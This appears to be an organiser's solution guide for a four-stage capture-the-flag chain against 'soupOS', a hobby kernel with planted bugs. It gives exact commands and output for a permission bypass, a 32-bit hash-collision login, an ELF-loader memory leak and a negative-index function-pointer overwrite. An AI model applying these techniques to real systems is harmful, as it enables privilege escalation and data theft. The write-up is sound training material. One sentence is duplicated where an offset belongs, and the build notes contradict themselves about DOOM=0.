# soupOS chain: solutions

**Spoilers. Organiser reference, not a player handout.**

Every step below was executed against the built image and produced the flag
shown. Where a number is specific to this build (addresses, offsets), the
paragraph says how to re-derive it, because those move if the kernel is
rebuilt with changes.

Setup for all stages: connect to the instance, log in as the account players
are given.

```
cook:   cook
secret: soup
```

Two things worth knowing before you start, both of which will otherwise cost
you time:

- **The root bowl is not writable by a cook.** Work in `/prep`, which exists
  for exactly this reason. `cd prep`.
- **Programs run with `cook` resolve paths from the root, not your current
  bowl.** `cook /unhex.elf T.HEX ...` fails; `cook /unhex.elf /prep/T.HEX ...`
  works. This trips everyone once.

---

## Stage 1: Mise en Place

**Flag:** `cdctf{mise_en_place_two_paths_one_check}`

**The bug:** two commands open files and only one checks permissions. The
shell's `may()` gate protects `pour`, `stir`, `cd` and friends. soupyc's
`open()` builtin calls `vfs_open()` directly and never asks.

The intended discovery is noticing `FLAG1.TXT` in the root, being refused, and
then spotting `soup <file>` in `menu`.

```
cd prep
pour /FLAG1.TXT
```
```
Permission denied: /FLAG1.TXT
```

`serve /` shows why: the file is owned by `headchef`, mode `rw----`. Now go
around the check. This fits on one line, so `stir` is enough:

```
stir S1.SC pour read(open("/FLAG1.TXT"), 45)
soup S1.SC
```
```
cdctf{mise_en_place_two_paths_one_check}
```

The `45` matters: soupyc strings cap at 47 characters, so read a length that
fits. Every flag in this chain is sized to stay under that cap.

---

## Stage 2: Salt to Taste

**Flag:** `cdctf{salt_to_taste_any_preimage_works}`

**The bug:** `/etc/kitchen` is world-readable and stores unsalted AlphaSOUP-32
hashes. `users_check()` compares hashes, so **any** preimage is accepted, not
just the real password. 32 bits is small enough to exhaust.

Read the roster:

```
pour /etc/kitchen
```
```
headchef:0:f63a9eb7
cook:1:e7d471fc
```

Confirm the target is gated:

```
special
```
```
Only the headchef knows today's special.
```

Now recover a preimage of `0xf63a9eb7`. `solve/crack.c` in the repo does it;
the hash is `alphasoup_hash()` in `src/alphasoup.c`, straightforward to
reimplement from the handout.

```bash
cc -O3 -fopenmp -o crack solve/crack.c
./crack 0xf63a9eb7
```
```
FOUND: "saohjea"  (len 7, hashes to 0xf63a9eb7)
```

About two minutes and roughly 2.2 billion candidates on a laptop. The real
password is `rosemary`; `saohjea` is a collision, and that is the whole point.
Any string with that hash gets in.

```
chef special
secret: saohjea
```
```
Today's special: cdctf{salt_to_taste_any_preimage_works}
```

> If you rebuild with a different headchef secret, re-run `crack` against the
> new hash from `/etc/kitchen`.

---

## Stage 3: Bad Recipe

**Flag:** `cdctf{bad_recipe_the_loader_reads_wide}`

**The bug:** `exec_elf` validates where a segment *writes* but not where it
*reads from*:

```c
memcpy((void *)ph->p_vaddr, buf + ph->p_offset, ph->p_filesz);
```

`p_vaddr` is checked against `[USER_LO, USER_HI)`. `p_offset` is not checked
against the file size at all. It is a `uint32_t` added to `buf`, the 256 KB
`kmalloc`'d file buffer, so it addresses anything in the 32-bit space,
including wrapping backwards.

The exploit is an ELF with two `PT_LOAD` segments: one carrying real code, one
carrying a hostile `p_offset` that lands kernel memory in the program's own
address space, where the code prints it.

### Getting a binary onto the disk

There is no upload, and **a soupyc script cannot write an ELF**: its strings
are a NUL-terminated `char[48]`, so `chr(0)` is not expressible and ELF headers
are full of NULs. `/unhex.elf` exists for this: it reads hex text and writes
raw bytes with `sys_write`, which takes an explicit length. It ignores
whitespace, so the hex can span many lines.

The shell's input line is 256 bytes, and the ELF is 150 bytes (300 hex
characters), so it will not fit in one `stir`. Use `jot`.

### Build it

```bash
python3 solve/mkleak.py -0xB8 0x60 > leak.hex
```

Arguments are the offset from `buf` and how many bytes to copy.

### Where does `-0xB8` come from?

`challenge_init()` runs at boot and does `kmalloc(64)` for the flag. `exec_elf`
later does `kmalloc(256*1024)` for the file buffer. The heap is a first-fit
free list, so the flag ends up just below the ELF buffer. In this build the
the flag ends up just below the ELF buffer.

**This number moves with every kernel size change**, and it has moved twice
already: `0x90` originally, `0x94` once Doom was added, `0x98` after the
paging work. Each time the symptom was the same and easy to misread - the
leak still fires but starts a few bytes into the flag, printing
`f{bad_recipe...` with `cdct` missing.

So the reference deliberately does not use the exact offset. `-0xB8 0x60`
starts 0x20 *before* the flag and dumps 96 bytes, which absorbs that drift at
the cost of some leading heap noise in the output. If you want a tidy dump for
a demo, find the exact gap and use `0x40`; if you want something that still
works after a rebuild, keep the wide window.

Players do not get those numbers. They scan: run with a large window
(`mkleak.py -0x4000 0x2000`) and look for `cdctf{` in the dump, then narrow.
Because the allocation order is deterministic, the offset is stable across
boots of the same image.

### Run it

```
cd prep
jot /prep/L.HEX          <- paste the hex, Ctrl+S to save, Esc to quit
cook /unhex.elf /prep/L.HEX /prep/L.ELF
```
```
unhex: wrote 150 bytes
```
```
cook /prep/L.ELF
```
```
cdctf{bad_recipe_the_loader_reads_wide}
```

---

## Stage 4: Too Many Cooks

**Flag:** `cdctf{too_many_cooks_ring0_from_a_script}`

**The bug:** soupyc's array assignment bounds-checks only the upper end:

```c
if (i >= a->len) { set_err("array index out of range"); ... }
a->elems[i] = v;
```

A negative index writes *below* the array pool. soupyc runs in ring 0, so this
is a kernel write, reached from a text file.

### What to overwrite

`soupyc.c` keeps its pool in a struct with a function pointer that is called
when a script finishes and that nothing ever sets:

```c
static struct {
    uint32_t  guard;                /* +0  */
    void    (*after_hook)(void);    /* +4  */
    uint8_t   pad[40];              /* +8  */
    arr_t     pool[MAX_ARRAYS];     /* +48 */
} sc_state;
```

A `val_t` is 56 bytes (`type`, `ival`, `sval[48]`), and `pool[0].elems` sits 56
bytes above the struct base. So `a[-1]` writes one `val_t` at exactly the base:
`type` lands on `guard`, and **`ival` lands on `after_hook`**.

The target is `serve_the_special()` in `src/challenge.c`, which nothing calls.
Get its address from the handed-out kernel:

```bash
nm kernel.elf | grep serve_the_special
```
```
00100990 T serve_the_special
```

`0x00100990` is `1051024` in decimal. soupyc integers are decimal.

### Run it

Two statements, so `jot` again:

```
jot /prep/S4.SC
```
```
let a = []
a[-1] = 1051024
```
Ctrl+S, Esc, then:

```
soup /prep/S4.SC
```
```
The kitchen is yours: cdctf{too_many_cooks_ring0_from_a_script}
```

The kernel keeps running afterwards; the hook fires once at end of script.

> `nm` gives the address for the image you handed out. Rebuild the kernel and
> it moves. Re-derive with `nm`, and re-check the `a[-1]` arithmetic if you
> ever change `SVAL_LEN`, `MAX_ARRAYS`, or the `sc_state` layout, since the
> whole trick depends on `sizeof(val_t)` matching the distance to the base.

---

## Why each stage is necessary

Worth preserving if the challenge is ever edited, because it is easy to break
by accident:

- **Stage 2's flag is not a file.** The stage 1 bypass reads any file on the
  volume, so a FLAG2 file would be readable at stage 1 and the chain would
  collapse to one step.
- **`taste` was removed, not gated.** It was an arbitrary kernel read at the
  prompt. Gating it on uid 0 is not enough, because stage 2 *makes* the player
  uid 0, which would hand them stage 3 for free.
- **Stage 3 reads, stage 4 writes.** The loader originally gave away both. The
  `p_vaddr` check closes the write so stage 4 still has a job.

## Rebuild checklist

The challenge image needs both flags. `CHALLENGE=1` re-opens the two planted
bugs (stages 3 and 4 do not exist without it) and `DOOM=0` keeps the WAD
parser out of the image:

```bash
make CHALLENGE=1 && make CHALLENGE=1 disk
```

Doom ships in the challenge image (decided 2026-08-27), so DOOM=0 is no
longer used. That is a deliberate tradeoff: it adds the WAD parser to the
attack surface, and DOOM1.WAD is 4 MB of the 32 MB disk.

A plain `make` builds normal soupOS: the bounds check and the p_offset
validation are restored, challenge.c is not compiled in, and none of the four
stages are solvable. That is the correct default; do not ship it as the
challenge.

After any kernel change, re-derive: the headchef hash (`pour /etc/kitchen`),
the stage 3 offset (scan, or log `buf` temporarily), and the stage 4 address
(`nm kernel.elf`). Then re-run this document top to bottom.
